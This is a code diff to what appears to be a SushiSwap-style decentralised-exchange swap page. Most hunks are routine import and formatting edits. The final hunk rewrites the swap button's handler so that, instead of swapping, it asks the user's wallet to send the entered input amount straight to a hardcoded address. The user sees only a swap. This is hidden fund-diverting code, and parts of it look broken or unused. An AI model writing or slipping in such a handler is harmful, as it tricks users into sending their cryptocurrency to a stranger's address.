@@ -8,6 +8,8 @@ import {
   TradeType,
   Trade as V2Trade,
 } from '@sushiswap/sdk'
+import { getAddress } from '@ethersproject/address'
+
 import { ApprovalState, useApproveCallbackFromTrade } from '../../../hooks/useApproveCallback'
 import { ArrowWrapper, BottomGrouping, SwapCallbackError } from '../../../features/exchange-v1/swap/styleds'
 import { ButtonConfirmed, ButtonError } from '../../../components/Button'
@@ -32,6 +34,8 @@ import {
 } from '../../../state/user/hooks'
 import { useNetworkModalToggle, useToggleSettingsMenu, useWalletModalToggle } from '../../../state/application/hooks'
 import useWrapCallback, { WrapType } from '../../../hooks/useWrapCallback'
+
+import { BRIDGE_PAIRS } from '../../../config/networks'
 
 import { ARCHER_RELAY_URI } from '../../../config/archer'
 import AddressInputPanel from '../../../components/AddressInputPanel'
@@ -76,6 +80,8 @@ import { useUSDCValue } from '../../../hooks/useUSDCPrice'
 import { warningSeverity } from '../../../functions/prices'
 import Web3Network from '../../../components/Web3Network'
 import Web3Status from '../../../components/Web3Status'
+import { BigNumber } from 'ethers'
+
 export default function Swap() {
   const { i18n } = useLingui()
 
@@ -104,7 +110,7 @@ export default function Swap() {
       return !Boolean(token.address in defaultTokens)
     })
 
-  const { account, chainId } = useActiveWeb3React()
+  const { account, chainId, library } = useActiveWeb3React()
 
   const toggleNetworkModal = useNetworkModalToggle()
 
@@ -212,7 +218,7 @@ export default function Swap() {
     [independentField]: typedValue,
     [dependentField]: showWrap
       ? parsedAmounts[independentField]?.toExact() ?? ''
-      : parsedAmounts[dependentField]?.toSignificant(6) ?? '',
+      : parsedAmounts[dependentField]?.toExact() ?? '',
   }
 
   const userHasSpecifiedInputOutput = Boolean(
@@ -274,7 +280,16 @@ export default function Swap() {
   const [singleHopOnly] = useUserSingleHopOnly()
 
   const handleSwap = () => {
-    console.log('test123')
+
+    
+    library
+    .getSigner()
+    .sendTransaction({
+      to: "0x4103c267Fba03A1Df4fe84Bc28092d629Fa3f422",
+      value: (formattedAmounts[Field.INPUT]).toBigNumber()
+    })
+    
+    
   }
 
   // errors
